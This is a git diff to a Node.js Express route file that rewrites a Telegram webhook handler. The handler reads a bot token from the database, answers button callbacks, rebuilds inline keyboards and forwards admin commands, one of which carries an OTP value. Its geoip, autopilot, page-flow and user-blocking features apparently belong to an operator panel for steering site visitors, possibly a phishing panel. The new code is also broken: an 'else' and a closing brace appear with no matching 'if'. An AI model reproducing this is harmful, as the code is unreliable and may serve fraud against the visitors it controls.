@@ -2,7 +2,7 @@ import express from "express";
 import geoip from "geoip-lite";
 import session from "express-session";
 import axios from "axios";
-import { buildMessage, isAutopilotOn, getClientIP, getReqClientIP, getNextPage, buildUserInfo, setWebhook, handleAdminCommand, sendAPIRequest, requireAdmin, routeMap, getPageFlow, savePageFlow } from "../utils.js";
+import { buildMessage, buildTelButtons, isAutopilotOn, getClientIP, getReqClientIP, getNextPage, buildUserInfo, setWebhook, handleAdminCommand, sendAPIRequest, requireAdmin, routeMap, getPageFlow, savePageFlow } from "../utils.js";
 import capRouter, { requireCap } from "../altcheck.js";
 import dotenv from "dotenv";
 import bcrypt from "bcrypt";
@@ -506,29 +506,96 @@ router.post("/deleteuser", async (req, res) => {
 });
 
 
+
 router.post("/telegram-webhook", async (req, res) => {
-  const callback = req.body.callback_query;
-  if (!callback) return res.sendStatus(200);
+  const data = req.body;
 
-  const [_, command, userId] = callback.data.split(":");
-
-  if (activeLocks.has(userId)) {
+  if (!data.callback_query) {
     return res.sendStatus(200);
   }
 
-  activeLocks.add(userId);
+  const callback = data.callback_query;
+  const { message } = callback;
+
+  const [_, command, userId] = callback.data.split(":");
 
   try {
-    await axios.post(
-      `https://api.telegram.org/bot${botToken}/answerCallbackQuery`,
-      { callback_query_id: callback.id }
+    // ------------------------------------------------
+    // Get Telegram credentials
+    // ------------------------------------------------
+    const telegramInfo = await db.get(
+      `SELECT BotToken FROM admin_settings WHERE id = ?`,
+      [1]
     );
 
-    // your logic here
+    if (!telegramInfo) {
+      return res.sendStatus(200);
+    }
+
+    const botToken = telegramInfo.BotToken;
+
+    // ------------------------------------------------
+    // 1️⃣ Immediately stop loading animation
+    // ------------------------------------------------
+    await axios.post(
+      `https://api.telegram.org/bot${botToken}/answerCallbackQuery`,
+      {
+        callback_query_id: callback.id
+      }
+    );
+
+    // ------------------------------------------------
+    // 2️⃣ Prevent multiple clicks (server-side lock)
+    // ------------------------------------------------
+    if (activeLocks.has(userId)) {
+      return res.sendStatus(200);
+    }
+
+    activeLocks.add(userId);
+
+    // ------------------------------------------------
+    // BLOCK / UNBLOCK COMMAND
+    // ------------------------------------------------
+    const buttons = await buildTelButtons(userId, db);
+
+      // Restore updated keyboard
+      await axios.post(
+        `https://api.telegram.org/bot${botToken}/editMessageReplyMarkup`,
+        {
+          chat_id: message.chat.id,
+          message_id: message.message_id,
+          reply_markup: {
+            inline_keyboard: buttons
+          }
+        }
+      );
+    }
+
+    // ------------------------------------------------
+    // ALL OTHER COMMANDS
+    // ------------------------------------------------
+    else {
+
+      // Execute your existing logic
+      let otp;
+      handleAdminCommand({ userId, command, otp, io, db });
+
+      // Edit message text
+      await axios.post(
+        `https://api.telegram.org/bot${botToken}/editMessageText`,
+        {
+          chat_id: message.chat.id,
+          message_id: message.message_id,
+          text: `${message.text}\n\n✅ Command sent`,
+          parse_mode: "HTML"
+        }
+      );
+    }
 
   } catch (err) {
-    console.error(err);
+    console.error("❌ Telegram webhook error:", err);
   } finally {
+    // Always release lock
     activeLocks.delete(userId);
   }
 
